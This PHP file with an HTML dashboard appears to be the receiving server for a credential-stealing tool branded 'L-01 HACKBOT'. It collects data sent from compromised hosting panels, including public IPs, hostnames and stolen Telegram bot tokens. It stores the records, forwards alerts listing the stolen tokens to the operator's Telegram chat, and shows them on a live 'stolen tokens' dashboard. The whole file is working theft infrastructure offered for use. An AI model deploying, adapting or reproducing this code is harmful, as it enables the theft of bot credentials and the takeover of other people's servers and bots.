<?php
/**
 * ============================================================
 * 🔥 L-01 WEBHOOK ULTIMATE v1.0 🔥
 * 📡 Auto Capture Bot Tokens | Panel IP | System Info
 * 👑 Created by @Aboutritxz | L-01 Qwerty Company
 * ⚡ XXO - REAL-TIME MONITORING
 * ============================================================
 */

// ========== KONFIGURASI ==========
$DATA_FILE = 'hack_results.json';
$LOG_FILE = 'hack_logs.txt';
$BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Token bot lo buat notif
$ADMIN_CHAT_ID = 'YOUR_TELEGRAM_ID_HERE'; // ID lo
$SECRET_KEY = 'L01_XXO_SECRET_2024'; // Kunci rahasia

// ========== FUNGSI ==========
function logMessage($message) {
    global $LOG_FILE;
    $log = date('[Y-m-d H:i:s] ') . $message . PHP_EOL;
    file_put_contents($LOG_FILE, $log, FILE_APPEND);
    echo $log;
}

function sendToTelegram($message) {
    global $BOT_TOKEN, $ADMIN_CHAT_ID;
    $url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
    $data = [
        'chat_id' => $ADMIN_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

function saveData($data) {
    global $DATA_FILE;
    
    $existing = [];
    if (file_exists($DATA_FILE)) {
        $existing = json_decode(file_get_contents($DATA_FILE), true);
        if (!is_array($existing)) $existing = [];
    }
    
    $data['id'] = uniqid();
    $data['timestamp'] = date('Y-m-d H:i:s');
    $data['ip_address'] = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    
    array_unshift($existing, $data);
    
    // Keep last 1000 records
    if (count($existing) > 1000) {
        $existing = array_slice($existing, 0, 1000);
    }
    
    file_put_contents($DATA_FILE, json_encode($existing, JSON_PRETTY_PRINT));
    return $data['id'];
}

// ========== HANDLE INCOMING DATA ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input) {
        http_response_code(400);
        die(json_encode(['error' => 'Invalid JSON']));
    }
    
    // Check secret key
    if (isset($input['secret']) && $input['secret'] !== $SECRET_KEY) {
        logMessage("⚠️ Invalid secret key from " . $_SERVER['REMOTE_ADDR']);
        http_response_code(403);
        die(json_encode(['error' => 'Invalid secret']));
    }
    
    // Save data
    $id = saveData($input);
    logMessage("✅ Data saved! ID: {$id} | Type: " . ($input['type'] ?? 'unknown'));
    
    // Format message for Telegram
    $message = "🔥 <b>L-01 HACKBOT ALERT!</b> 🔥\n\n";
    $message .= "📍 <b>Panel Info:</b>\n";
    $message .= "• IP: <code>{$input['panel']['publicIP']}</code>\n";
    $message .= "• Hostname: {$input['panel']['hostname']}\n";
    $message .= "• Platform: {$input['panel']['platform']}\n";
    $message .= "• RAM: {$input['panel']['memory']}\n\n";
    
    if (!empty($input['tokens'])) {
        $message .= "🤖 <b>Stolen Tokens:</b>\n";
        foreach (array_slice($input['tokens'], 0, 5) as $token) {
            $message .= "• @{$token['botInfo']['username']} - <code>{$token['token']}</code>\n";
        }
        if (count($input['tokens']) > 5) {
            $message .= "• ... and " . (count($input['tokens']) - 5) . " more\n";
        }
    }
    
    $message .= "\n📊 <b>Stats:</b>\n";
    $message .= "• Tokens: {$input['stats']['total_tokens']}\n";
    $message .= "• Files: {$input['stats']['scanned_files']}\n";
    $message .= "• Processes: {$input['stats']['processes']}\n";
    $message .= "\n🔗 <a href='https://" . $_SERVER['HTTP_HOST'] . "/dashboard.html'>View Dashboard</a>";
    
    sendToTelegram($message);
    
    echo json_encode(['status' => 'success', 'id' => $id]);
    exit;
}

// ========== GET DATA (API) ==========
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    header('Content-Type: application/json');
    
    if ($_GET['action'] === 'get_data') {
        if (file_exists($DATA_FILE)) {
            $data = json_decode(file_get_contents($DATA_FILE), true);
            echo json_encode($data);
        } else {
            echo json_encode([]);
        }
        exit;
    }
    
    if ($_GET['action'] === 'stats') {
        if (file_exists($DATA_FILE)) {
            $data = json_decode(file_get_contents($DATA_FILE), true);
            $stats = [
                'total_hacks' => count($data),
                'total_tokens' => array_sum(array_column($data, 'stats_total_tokens')),
                'last_hack' => $data[0]['timestamp'] ?? null,
                'unique_ips' => count(array_unique(array_column($data, 'panel_publicIP')))
            ];
            echo json_encode($stats);
        } else {
            echo json_encode(['total_hacks' => 0]);
        }
        exit;
    }
}

// ========== DASHBOARD HTML ==========
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L-01 HACKBOT DASHBOARD</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: 'Courier New', 'Fira Code', monospace;
            color: #0ff;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #0ff;
            padding-bottom: 20px;
        }
        
        .glitch {
            font-size: 48px;
            font-weight: bold;
            text-shadow: 2px 2px 0 #ff00ff, -2px -2px 0 #00ffff;
            animation: glitch 0.3s infinite;
        }
        
        @keyframes glitch {
            0% { transform: skew(0deg, 0deg); }
            100% { transform: skew(0deg, 0deg); }
        }
        
        /* Stats Cards */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            backdrop-filter: blur(10px);
            transition: all 0.3s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        
        .stat-value {
            font-size: 48px;
            font-weight: bold;
            color: #ff3366;
            text-shadow: 0 0 10px #ff3366;
        }
        
        .stat-label {
            font-size: 14px;
            color: #0ff;
            margin-top: 10px;
        }
        
        /* Table */
        .data-table {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid #0ff;
            border-radius: 10px;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 255, 255, 0.3);
        }
        
        th {
            background: rgba(0, 255, 255, 0.1);
            color: #0ff;
            font-weight: bold;
        }
        
        td {
            font-size: 12px;
            font-family: monospace;
        }
        
        tr:hover {
            background: rgba(0, 255, 255, 0.05);
        }
        
        .token {
            background: #1a1a2e;
            padding: 2px 5px;
            border-radius: 3px;
            font-size: 10px;
            cursor: pointer;
        }
        
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: bold;
        }
        
        .badge-success {
            background: #00ff00;
            color: #000;
        }
        
        .badge-warning {
            background: #ff6600;
            color: #000;
        }
        
        /* Refresh Button */
        .refresh-btn {
            background: linear-gradient(45deg, #ff3366, #ff00cc);
            border: none;
            padding: 10px 20px;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 20px;
            font-family: monospace;
        }
        
        .refresh-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px #ff3366;
        }
        
        /* Status */
        .status {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            padding: 10px;
            border-radius: 5px;
            font-size: 10px;
            border-left: 3px solid #0ff;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        
        .live {
            color: #ff3366;
            animation: pulse 1s infinite;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1 class="glitch">💀 L-01 HACKBOT DASHBOARD 💀</h1>
            <p>⚡ REAL-TIME STOLEN BOT TOKENS MONITOR ⚡</p>
            <p style="font-size: 12px; color: #ff3366;">XXO - LIBERATED MODE - NO FILTERS</p>
        </div>
        
        <div class="stats-grid" id="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalHacks">0</div>
                <div class="stat-label">TOTAL HACKS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalTokens">0</div>
                <div class="stat-label">STOLEN TOKENS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="uniqueIPs">0</div>
                <div class="stat-label">UNIQUE PANELS</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="lastHack">-</div>
                <div class="stat-label">LAST HACK</div>
            </div>
        </div>
        
        <button class="refresh-btn" onclick="loadData()">⟳ REFRESH DATA</button>
        
        <div class="data-table">
            <table id="dataTable">
                <thead>
                    <tr>
                        <th>TIME</th>
                        <th>PANEL IP</th>
                        <th>HOSTNAME</th>
                        <th>TOKENS</th>
                        <th>RAM</th>
                        <th>SOURCE IP</th>
                    </tr>
                </thead>
                <tbody id="tableBody">
                    <tr>
                        <td colspan="6" style="text-align: center;">Loading data...</td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="status">
            <span class="live">● LIVE</span> | Last update: <span id="lastUpdate">-</span>
        </div>
    </div>
    
    <script>
        async function loadData() {
            try {
                const response = await fetch('?action=get_data');
                const data = await response.json();
                
                if (!data || data.length === 0) {
                    document.getElementById('tableBody').innerHTML = '<tr><td colspan="6" style="text-align: center;">No data yet. Waiting for hackbot...</td></tr>';
                    return;
                }
                
                // Update stats
                let totalTokens = 0;
                const uniqueIPs = new Set();
                
                data.forEach(item => {
                    if (item.tokens) totalTokens += item.tokens.length;
                    if (item.panel?.publicIP) uniqueIPs.add(item.panel.publicIP);
                });
                
                document.getElementById('totalHacks').innerText = data.length;
                document.getElementById('totalTokens').innerText = totalTokens;
                document.getElementById('uniqueIPs').innerText = uniqueIPs.size;
                document.getElementById('lastHack').innerText = data[0]?.timestamp?.split(' ')[0] || '-';
                
                // Update table
                const tbody = document.getElementById('tableBody');
                tbody.innerHTML = '';
                
                data.slice(0, 50).forEach(item => {
                    const row = tbody.insertRow();
                    
                    row.insertCell(0).innerHTML = `<span style="font-size: 11px;">${item.timestamp || '-'}</span>`;
                    row.insertCell(1).innerHTML = `<code>${item.panel?.publicIP || '-'}</code>`;
                    row.insertCell(2).innerHTML = item.panel?.hostname || '-';
                    row.insertCell(3).innerHTML = item.tokens ? `<span class="badge badge-success">${item.tokens.length} token(s)</span>` : '<span class="badge badge-warning">0</span>';
                    row.insertCell(4).innerHTML = item.panel?.memory || '-';
                    row.insertCell(5).innerHTML = `<code style="font-size: 10px;">${item.ip_address || '-'}</code>`;
                });
                
                document.getElementById('lastUpdate').innerText = new Date().toLocaleTimeString();
                
            } catch (error) {
                console.error('Error loading data:', error);
                document.getElementById('tableBody').innerHTML = '<tr><td colspan="6" style="text-align: center; color: red;">Error loading data</td></tr>';
            }
        }
        
        // Auto refresh every 10 seconds
        loadData();
        setInterval(loadData, 10000);
    </script>
</body>
</html>
